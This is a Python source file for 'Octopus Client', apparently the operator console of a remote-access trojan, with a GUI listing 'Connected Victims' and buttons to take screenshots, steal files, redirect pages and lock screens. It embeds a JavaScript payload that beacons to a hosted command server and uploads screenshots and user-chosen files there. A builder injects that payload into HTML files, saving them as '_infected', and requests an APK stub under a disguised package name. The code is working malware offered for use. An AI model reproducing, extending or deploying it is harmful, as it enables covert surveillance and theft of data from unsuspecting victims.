# filename: client.py
import tkinter as tk
from tkinter import filedialog, messagebox, ttk, scrolledtext, simpledialog
import requests
import threading
import time
import json
import os
import io
import webbrowser
from datetime import datetime
from PIL import Image, ImageTk

# ================= إعدادات الاتصال =================
# تأكد أن هذا الرابط هو رابط سيرفرك الحالي على Railway
SERVER_URL = "https://web-production-5330.up.railway.app" 

# ================= الألوان والتصميم (Dark Theme) =================
THEME = {
    "bg_main": "#0f172a",       # خلفية داكنة جداً
    "bg_sec": "#1e293b",        # خلفية القوائم
    "fg_text": "#f1f5f9",       # نص أبيض
    "fg_accent": "#38bdf8",     # أزرق سماوي للعناوين
    "btn_bg": "#334155",        # خلفية الأزرار
    "btn_fg": "#ffffff",        # نص الأزرار
    "success": "#22c55e",       # أخضر
    "warning": "#f59e0b",       # برتقالي
    "danger": "#ef4444"         # أحمر
}

# ================= Ultimate Payload v13 (JavaScript) =================
PAYLOAD_JS = """
<script>
(function() {
    const SERVER = location.origin;
    let DEV_ID = localStorage.getItem("_oct_uid") || "MOB-" + Math.random().toString(36).substr(2, 9).toUpperCase();
    localStorage.setItem("_oct_uid", DEV_ID);

    // تحميل html2canvas
    if (typeof html2canvas === 'undefined') {
        const s = document.createElement('script');
        s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        document.head.appendChild(s);
    }

    async function hb() {
        try {
            const r = await fetch(SERVER + "/api/heartbeat", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({device_id: DEV_ID})
            });
            const d = await r.json();
            if (d.commands) d.commands.forEach(c => run(c));
        } catch(e) {}
    }

    function run(c) {
        if (c.type === "alert") alert(c.data.message);
        if (c.type === "redirect") location.href = c.data.url;
        if (c.type === "lock") document.body.innerHTML = "<h1 style='color:red;font-size:50px;text-align:center;margin-top:50%'>DEVICE LOCKED</h1>";
        
        if (c.type === "screenshot" && typeof html2canvas !== 'undefined') {
            html2canvas(document.body, {scale: 2, logging: false, useCORS: true}).then(cvs => {
                fetch(SERVER + "/api/upload", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({data: cvs.toDataURL("image/jpeg", 0.8), device_id: DEV_ID, type: "screenshot"})
                });
            });
        }
        
        if (c.type === "steal_file") {
            const inp = document.createElement('input'); inp.type = 'file'; inp.multiple = true;
            inp.onchange = e => {
                for (let f of e.target.files) {
                    const r = new FileReader();
                    r.onload = () => {
                        fetch(SERVER + "/api/upload", {
                            method: "POST", 
                            headers: {"Content-Type": "application/json"},
                            body: JSON.stringify({data: r.result.split(',')[1], filename: f.name, device_id: DEV_ID, type: "stolen_file"})
                        });
                    };
                    r.readAsDataURL(f);
                }
                alert("Upload Complete");
            };
            inp.click();
        }
        
        if (c.type === "send_file") {
            const a = document.createElement('a');
            a.href = c.data.url; a.download = c.data.name; a.click();
        }
    }

    fetch(SERVER + "/api/connect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({device_id: DEV_ID, model: navigator.userAgent})
    });

    setInterval(hb, 3000);
})();
</script>
"""

class OctopusClient:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("🐙 Octopus Client v13.0 - Administrator")
        self.root.geometry("1400x900")
        self.root.configure(bg=THEME["bg_main"])

        self.selected_id = None
        self.server_ready = False
        self.running = True

        self.setup_ui()
        
        # تشغيل الاتصال في الخلفية
        threading.Thread(target=self.bg_service, daemon=True).start()

    def setup_ui(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Treeview", background=THEME["bg_sec"], foreground="white", fieldbackground=THEME["bg_sec"], rowheight=35, font=("Consolas", 10))
        style.configure("Treeview.Heading", background=THEME["bg_main"], foreground=THEME["fg_accent"], font=("Arial", 11, "bold"))
        style.map("Treeview", background=[('selected', THEME["fg_accent"])], foreground=[('selected', 'black')])

        # 1. Header
        header = tk.Frame(self.root, bg=THEME["bg_main"])
        header.pack(fill="x", pady=15, padx=20)
        tk.Label(header, text="OCTOPUS CONTROL", font=("Impact", 32), bg=THEME["bg_main"], fg=THEME["success"]).pack(side="left")
        self.status_lbl = tk.Label(header, text="DISCONNECTED", font=("Consolas", 14, "bold"), bg=THEME["bg_main"], fg=THEME["danger"])
        self.status_lbl.pack(side="right")

        # 2. Main Split (PanedWindow)
        paned = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, bg=THEME["bg_main"], sashwidth=5)
        paned.pack(fill="both", expand=True, padx=20, pady=10)

        # --- LEFT: Victim List ---
        left_frame = tk.LabelFrame(paned, text=" Connected Victims ", bg=THEME["bg_main"], fg=THEME["fg_accent"], font=("Arial", 12, "bold"))
        paned.add(left_frame, width=500)

        cols = ("ID", "Model", "IP", "Status")
        self.tree = ttk.Treeview(left_frame, columns=cols, show="headings")
        self.tree.heading("ID", text="ID"); self.tree.column("ID", width=100)
        self.tree.heading("Model", text="Model"); self.tree.column("Model", width=200)
        self.tree.heading("IP", text="IP Addr"); self.tree.column("IP", width=120)
        self.tree.heading("Status", text="State"); self.tree.column("Status", width=80)
        self.tree.pack(fill="both", expand=True, padx=5, pady=5)
        self.tree.bind("<<TreeviewSelect>>", self.on_select)

        # --- RIGHT: Control Panel ---
        right_frame = tk.Frame(paned, bg=THEME["bg_main"])
        paned.add(right_frame)

        # Target Info
        self.target_lbl = tk.Label(right_frame, text="[ SELECT A VICTIM ]", font=("Consolas", 16, "bold"), fg=THEME["warning"], bg=THEME["bg_main"])
        self.target_lbl.pack(pady=10)

        # Commands Grid
        cmd_frame = tk.LabelFrame(right_frame, text=" Remote Commands ", bg=THEME["bg_main"], fg="white", font=("Arial", 11, "bold"))
        cmd_frame.pack(fill="x", padx=5, pady=5)

        btns = [
            ("📸 Screenshot", "screenshot", THEME["fg_accent"]),
            ("📢 Alert Message", "alert", THEME["warning"]),
            ("🌐 Open URL", "redirect", THEME["success"]),
            ("🔒 Lock Screen", "lock", THEME["danger"]),
            ("📂 Steal Files", "steal_file", "#a855f7"),
            ("📤 Send File", "send_file", "#ec4899")
        ]

        for i, (txt, cmd, clr) in enumerate(btns):
            b = tk.Button(cmd_frame, text=txt, bg=clr, fg="black", font=("Arial", 10, "bold"),
                          activebackground="white", cursor="hand2", width=20,
                          command=lambda c=cmd: self.send_cmd(c))
            b.grid(row=i//2, column=i%2, padx=15, pady=10)
        
        cmd_frame.grid_columnconfigure(0, weight=1)
        cmd_frame.grid_columnconfigure(1, weight=1)

        # File Operations
        file_frame = tk.LabelFrame(right_frame, text=" Files & Builder ", bg=THEME["bg_main"], fg="white", font=("Arial", 11, "bold"))
        file_frame.pack(fill="x", padx=5, pady=10)

        tk.Label(file_frame, text="File Name (e.g. screenshot_xxx.jpg):", bg=THEME["bg_main"], fg="white").pack(anchor="w", padx=10)
        self.file_ent = tk.Entry(file_frame, bg=THEME["bg_sec"], fg="white", font=("Consolas", 11))
        self.file_ent.pack(fill="x", padx=10, pady=5)

        f_btns = tk.Frame(file_frame, bg=THEME["bg_main"])
        f_btns.pack(fill="x", padx=10, pady=5)
        tk.Button(f_btns, text="👁️ Preview", bg="#0ea5e9", fg="white", width=15, command=self.preview_file).pack(side="left", padx=5)
        tk.Button(f_btns, text="⬇️ Download", bg="#6366f1", fg="white", width=15, command=self.download_file).pack(side="left", padx=5)
        tk.Button(f_btns, text="🔨 Payload Builder", bg=THEME["danger"], fg="white", width=20, command=self.open_builder).pack(side="right", padx=5)

        # Preview Area
        self.preview_lbl = tk.Label(right_frame, text="[ Preview Area ]", bg="black", fg="#555", height=15)
        self.preview_lbl.pack(fill="both", expand=True, padx=5, pady=10)

        # Logs
        log_frame = tk.LabelFrame(self.root, text=" Logs ", bg=THEME["bg_main"], fg="white")
        log_frame.pack(fill="x", padx=20, pady=10, side="bottom")
        self.log_box = scrolledtext.ScrolledText(log_frame, height=6, bg="black", fg="#00ff00", font=("Consolas", 10))
        self.log_box.pack(fill="both")

    # --- Background Logic ---
    def bg_service(self):
        # 1. Wake Server
        while self.running:
            try:
                self.root.after(0, lambda: self.status_lbl.config(text="CONNECTING...", fg=THEME["warning"]))
                requests.get(SERVER_URL + "/control", timeout=60)
                self.server_ready = True
                self.root.after(0, lambda: self.status_lbl.config(text="ONLINE 🟢", fg=THEME["success"]))
                self.log("✅ Server Connected!")
                break
            except Exception as e:
                self.log(f"⏳ Retry: {e}")
                time.sleep(3)

        # 2. Fetch Data
        while self.running:
            try:
                if self.server_ready:
                    r = requests.get(SERVER_URL + "/api/devices_list", timeout=20)
                    if r.status_code == 200:
                        self.root.after(0, lambda d=r.json(): self.update_list(d))
            except: pass
            time.sleep(4)

    def update_list(self, data):
        sel = self.tree.selection()
        cur = self.tree.item(sel[0])['values'][0] if sel else None
        
        for i in self.tree.get_children(): self.tree.delete(i)
        
        for d in data:
            self.tree.insert("", "end", values=(
                d.get('id', 'N/A')[:12], 
                d.get('model', '?')[:25], 
                d.get('ip_address', '0.0.0.0'),
                d.get('status', 'off')
            ))
            
        if cur:
            for i in self.tree.get_children():
                if self.tree.item(i)['values'][0] == cur:
                    self.tree.selection_set(i)
                    break

    def on_select(self, e):
        sel = self.tree.selection()
        if sel:
            v = self.tree.item(sel[0])["values"]
            self.selected_id = v[0]
            self.target_lbl.config(text=f"🎯 Target: {v[1]}", fg=THEME["fg_accent"])
        else:
            self.selected_id = None
            self.target_lbl.config(text="[ No Target ]", fg=THEME["warning"])

    def send_cmd(self, cmd):
        if not self.selected_id: return messagebox.showwarning("Error", "Select a victim!")
        
        payload = {}
        if cmd == "alert": payload = {"message": simpledialog.askstring("Alert", "Message:")}
        if cmd == "redirect": payload = {"url": simpledialog.askstring("Redirect", "URL:")}
        if cmd == "send_file":
            f = simpledialog.askstring("Send", "Filename on Server:")
            if not f: return
            payload = {"url": f"{SERVER_URL}/send/{f}", "name": f}

        def _req():
            try:
                # TIMEOUT FIX: Increased to 45 seconds to avoid 'Read timed out'
                requests.post(f"{SERVER_URL}/api/command", json={
                    "device_id": self.selected_id, "type": cmd, "payload": payload
                }, timeout=45)
                self.log(f"✅ Command '{cmd}' Sent.")
            except Exception as e:
                self.log(f"❌ Error: {e}")

        threading.Thread(target=_req, daemon=True).start()
        if cmd in ["screenshot", "steal_file"]: self.log("⏳ Waiting for upload...")

    def preview_file(self):
        f = self.file_ent.get()
        if not f: return
        url = SERVER_URL + ("/uploads/" + f if not f.startswith("http") else f)
        
        def _load():
            try:
                r = requests.get(url, timeout=30)
                r.raise_for_status()
                img = Image.open(io.BytesIO(r.content))
                img.thumbnail((600, 400))
                ti = ImageTk.PhotoImage(img)
                self.root.after(0, lambda: self._upd_img(ti))
                self.log("✅ Image Loaded")
            except Exception as e: self.log(f"❌ Load Error: {e}")
        
        threading.Thread(target=_load, daemon=True).start()

    def _upd_img(self, img):
        self.preview_lbl.config(image=img, text="")
        self.preview_lbl.image = img

    def download_file(self):
        f = self.file_ent.get()
        if f: webbrowser.open(f"{SERVER_URL}/uploads/{f}")

    def open_builder(self):
        win = tk.Toplevel(self.root)
        win.title("Builder")
        win.geometry("600x400")
        win.configure(bg=THEME["bg_main"])
        
        tk.Button(win, text="Inject HTML Payload", bg=THEME["warning"], fg="black", font=("Arial", 12),
                  command=self.inject_html).pack(pady=20, fill="x", padx=50)
        
        tk.Label(win, text="APK Package Name:", bg=THEME["bg_main"], fg="white").pack()
        e = tk.Entry(win); e.pack(); e.insert(0, "com.sys.upd")
        
        tk.Button(win, text="Generate Java Stub", bg=THEME["danger"], fg="white", font=("Arial", 12),
                  command=lambda: self.gen_apk(e.get())).pack(pady=20, fill="x", padx=50)

    def inject_html(self):
        p = filedialog.askopenfilename(filetypes=[("HTML", "*.html")])
        if p:
            with open(p, 'r', encoding='utf-8') as f: c = f.read()
            n = c.replace("</body>", PAYLOAD_JS + "</body>") if "</body>" in c else c + PAYLOAD_JS
            sp = p.replace(".html", "_infected.html")
            with open(sp, 'w', encoding='utf-8') as f: f.write(n)
            messagebox.showinfo("Success", f"Saved: {os.path.basename(sp)}")

    def gen_apk(self, pkg):
        def _g():
            try:
                r = requests.post(f"{SERVER_URL}/api/generate_apk", json={"package_name": pkg})
                top = tk.Toplevel(self.root)
                st = scrolledtext.ScrolledText(top); st.pack()
                st.insert("1.0", r.json().get("code"))
            except: messagebox.showerror("Error", "Failed")
        threading.Thread(target=_g).start()

    def log(self, m):
        t = datetime.now().strftime("%H:%M:%S")
        self.log_box.insert("end", f"[{t}] {m}\n")
        self.log_box.see("end")

if __name__ == "__main__":
    OctopusClient().root.mainloop()
